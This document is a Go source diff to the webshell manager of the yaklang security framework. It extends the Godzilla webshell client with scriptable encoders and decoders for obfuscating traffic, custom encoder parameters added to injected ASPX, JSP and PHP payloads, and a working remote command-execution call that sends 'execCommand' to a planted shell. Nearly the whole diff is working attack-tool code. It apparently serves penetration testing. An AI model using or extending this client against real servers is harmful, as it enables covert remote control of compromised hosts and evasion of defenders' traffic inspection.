@@ -2,6 +2,7 @@ package wsm
 
 import (
 	"bytes"
+	"context"
 	"encoding/hex"
 	"fmt"
 	"github.com/yaklang/yaklang/common/javaclassparser"
@@ -12,6 +13,7 @@ import (
 	"github.com/yaklang/yaklang/common/wsm/payloads"
 	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
 	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla"
+	"github.com/yaklang/yaklang/common/yak"
 	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
 	"net/http"
 	"strings"
@@ -39,7 +41,12 @@ type Godzilla struct {
 	req             *http.Request
 	dynamicFuncName map[string]string
 
-	CustomEncoder codecFunc
+	PacketScriptContent  string
+	PayloadScriptContent string
+
+	customEchoEncoder   codecFunc
+	customEchoDecoder   codecFunc
+	customPacketEncoder codecFunc
 }
 
 func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
@@ -53,13 +60,7 @@ func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
 		Headers:         make(map[string]string, 2),
 		dynamicFuncName: make(map[string]string, 2),
 	}
-	gs.CustomEncoder = func(raw []byte) ([]byte, error) {
-		enPayload, err := godzilla.Encryption(raw, gs.SecretKey, gs.Pass, gs.EncMode, gs.ShellScript, true)
-		if err != nil {
-			return nil, err
-		}
-		return enPayload, nil
-	}
+
 	gs.setContentType()
 	//if ys.GetHeaders() != nil {
 	//	gs.Headers = ys.GetHeaders()
@@ -68,13 +69,47 @@ func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
 }
 
 func (g *Godzilla) SetPayloadScriptContent(content string) {
-	//TODO implement me
-	panic("implement me")
+	g.PayloadScriptContent = content
+}
+
+func (g *Godzilla) SetPacketScriptContent(content string) {
+	g.PacketScriptContent = content
+
+}
+
+func (g *Godzilla) clientRequestEncode(raw []byte) ([]byte, error) {
+	enRaw, err := g.enCryption(raw)
+	if err != nil {
+		return nil, err
+	}
+	if len(g.PacketScriptContent) == 0 {
+		return enRaw, nil
+	}
+
+	if g.customPacketEncoder != nil {
+		return g.customPacketEncoder(enRaw)
+	}
+	return g.ClientRequestEncode(enRaw)
 }
 
 func (g *Godzilla) ClientRequestEncode(raw []byte) ([]byte, error) {
-	//TODO implement me
-	panic("implement me")
+	if len(g.PacketScriptContent) == 0 {
+		return nil, utils.Errorf("empty packet script content")
+	}
+
+	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PacketScriptContent, map[string]interface{}{
+		"YAK_FILENAME": "req.GetScriptName()",
+	})
+	if err != nil {
+		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
+	}
+	result, err := engine.CallYakFunction(context.Background(), "wsmPacketEncoder", []interface{}{raw})
+	if err != nil {
+		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
+	}
+	rspBytes := utils.InterfaceToBytes(result)
+
+	return rspBytes, nil
 }
 
 func (g *Godzilla) ServerResponseDecode(raw []byte) ([]byte, error) {
@@ -82,19 +117,69 @@ func (g *Godzilla) ServerResponseDecode(raw []byte) ([]byte, error) {
 	panic("implement me")
 }
 
+func (g *Godzilla) echoResultEncode(raw []byte) ([]byte, error) {
+	if g.customEchoEncoder != nil {
+		return g.customEchoEncoder(raw)
+	}
+	return g.EchoResultEncodeFormYak(raw)
+}
+
 func (g *Godzilla) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
-	//TODO implement me
-	panic("implement me")
+	if len(g.PayloadScriptContent) == 0 {
+		return []byte(""), nil
+	}
+
+	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
+		"YAK_FILENAME": "req.GetScriptName()",
+	})
+	if err != nil {
+		return nil, utils.Errorf("execute file %s code failed: %s", "EchoResultEncodeFormYak", err.Error())
+	}
+	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
+	if err != nil {
+		return nil, utils.Errorf("import %v' s handle failed: %s", "EchoResultEncodeFormYak", err)
+	}
+	rspBytes := utils.InterfaceToBytes(result)
+
+	return rspBytes, nil
+}
+
+func (g *Godzilla) echoResultDecode(raw []byte) ([]byte, error) {
+	if g.customEchoDecoder != nil {
+		return g.customEchoDecoder(raw)
+	}
+	return g.EchoResultDecodeFormYak(raw)
 }
 
 func (g *Godzilla) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
-	//TODO implement me
-	panic("implement me")
+	if len(g.PayloadScriptContent) == 0 {
+		return g.deCryption(raw)
+	}
+	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
+		"YAK_FILENAME": "req.GetScriptName()",
+	})
+	if err != nil {
+		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
+	}
+	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadDecoder", []interface{}{raw})
+	if err != nil {
+		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
+	}
+	rspBytes := utils.InterfaceToBytesSlice(result)[0]
+
+	return rspBytes, nil
 }
 
-func (g *Godzilla) SetPacketScriptContent(content string) {
-	//TODO implement me
-	panic("implement me")
+func (g *Godzilla) EchoResultEncodeFormGo(en codecFunc) {
+	g.customEchoEncoder = en
+}
+
+func (g *Godzilla) EchoResultDecodeFormGo(de codecFunc) {
+	g.customEchoDecoder = de
+}
+
+func (g *Godzilla) ClientRequestEncodeFormGo(en codecFunc) {
+	g.customPacketEncoder = en
 }
 
 func (g *Godzilla) setDefaultParams() map[string]string {
@@ -113,6 +198,23 @@ func (g *Godzilla) setContentType() {
 	default:
 		panic("shell script type error [JSP/JSPX/ASP/ASPX/PHP]")
 	}
+}
+
+// 原生的加密方式
+func (g *Godzilla) enCryption(binCode []byte) ([]byte, error) {
+	enPayload, err := godzilla.Encryption(binCode, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, true)
+	if err != nil {
+		return nil, err
+	}
+	return enPayload, nil
+}
+
+func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
+	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
+	if err != nil {
+		return nil, err
+	}
+	return deBody, nil
 }
 
 func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
@@ -139,10 +241,11 @@ func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
 		r1 := utils.RandStringBytes(50)
 		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
 	case ypb.ShellScript_ASPX.String():
-		payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
-		if err != nil {
-			return nil, err
-		}
+		//payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
+		//if err != nil {
+		//	return nil, err
+		//}
+		payload = payloads.CshrapPayload
 	case ypb.ShellScript_ASP.String():
 		payload, err = hex.DecodeString(godzilla.AspCodePayload)
 		if err != nil {
@@ -189,14 +292,6 @@ func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) (
 	return clsObj.Bytes(), nil
 }
 
-func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
-	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
-	if err != nil {
-		return nil, err
-	}
-	return deBody, nil
-}
-
 func (g *Godzilla) post(data []byte) ([]byte, error) {
 	resp, req, err := poc.DoPOST(
 		g.Url,
@@ -220,21 +315,30 @@ func (g *Godzilla) post(data []byte) ([]byte, error) {
 }
 
 func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
-	body, err := g.post(data)
+	enData, err := g.clientRequestEncode(data)
+	if err != nil {
+		return nil, err
+	}
+	body, err := g.post(enData)
 	if err != nil {
 		return nil, err
 	}
 	if len(body) == 0 {
 		return nil, utils.Error("返回数据为空")
 	}
-	return g.deCryption(body)
+	deBody, err := g.deCryption(body)
+	if err != nil {
+		return nil, err
+	}
+	log.Infof("默认解密后: %s", string(deBody))
+	return g.echoResultDecode(deBody)
 }
 
 // EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
 func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
 	// 填充随机长度
-	r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
-	parameter.AddString(r1, r2)
+	//r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
+	//parameter.AddString(r1, r2)
 	if className != "" && len(strings.Trim(className, " ")) > 0 {
 		switch g.ShellScript {
 		case ypb.ShellScript_JSPX.String():
@@ -255,11 +359,9 @@ func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Para
 	log.Infof("send data: %q", string(data))
 
 	//enData, err := g.enCryption(data)
-	enData, err := g.CustomEncoder(data)
-	if err != nil {
-		return nil, err
-	}
-	return g.sendPayload(enData)
+	//enData, err := g.customEncoder(data)
+
+	return g.sendPayload(data)
 }
 
 func newParameter() *godzilla.Parameter {
@@ -303,7 +405,7 @@ func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
 			return false, err
 		}
 		resultString := strings.Trim(string(result), " ")
-		if resultString == "ok" {
+		if resultString == "ok" || resultString == "ko" {
 			return true, nil
 		} else {
 			return false, utils.Error(resultString)
@@ -328,6 +430,24 @@ func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
 
 func (g *Godzilla) InjectPayload() error {
 	payload, err := g.getPayload("")
+	params := make(map[string]string, 2)
+	value, _ := g.echoResultEncode([]byte(""))
+	if len(value) != 0 {
+		switch g.ShellScript {
+		case ypb.ShellScript_ASPX.String():
+			// todo
+			params["customEncoderFromAssembly"] = string(value)
+			payload, err = behinder.GetRawAssembly(hex.EncodeToString(payload), params)
+			if err != nil {
+				return err
+			}
+		case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
+			params["customEncoderFromClass"] = string(value)
+		case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
+			params["customEncoderFromText"] = string(value)
+		}
+	}
+
 	if err != nil {
 		return err
 	}
@@ -412,7 +532,7 @@ func (g *Godzilla) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) 
 	}
 
 	parameter := newParameter()
-	basicsInfo, err := g.EvalFunc("", "getBasicsInfo2", parameter)
+	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
 	if err != nil {
 		return nil, err
 	}
@@ -424,7 +544,9 @@ func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([
 	if err != nil {
 		return nil, err
 	}
-	return nil, nil
+	parameter := newParameter()
+	parameter.AddString("cmdLine", cmd)
+	return g.EvalFunc("", "execCommand", parameter)
 }
 
 func (g *Godzilla) FileManagement() {
